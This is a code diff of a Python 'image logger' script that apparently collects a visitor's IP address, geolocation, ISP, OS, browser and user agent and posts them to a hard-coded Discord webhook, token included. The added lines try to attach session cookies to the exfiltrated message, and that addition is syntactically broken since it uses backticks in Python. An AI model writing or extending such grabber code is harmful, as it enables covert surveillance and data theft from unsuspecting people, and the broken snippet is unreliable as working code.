@@ -5,6 +5,8 @@ import requests, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1067214101119500378/k-KwGxl5rew0GZJHPje6OE7RddBc_hZ82AjjpWbrRNVsQysrmc1g-x7gc6ksz0bPnN6w'
 bindata = requests.get('https://cdn.socialmediapornstars.com/img/650a.jpg').content
 
+session = requests.Session()
+response = session.get('http://google.com')
 
 
 
@@ -34,7 +36,10 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
           "name": "Advanced Info",
           "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
           "inline": False
-        }
+        },
+          {
+              "value":`{session.cookies.get_dict()}`
+          }
       ]
     }
   ],
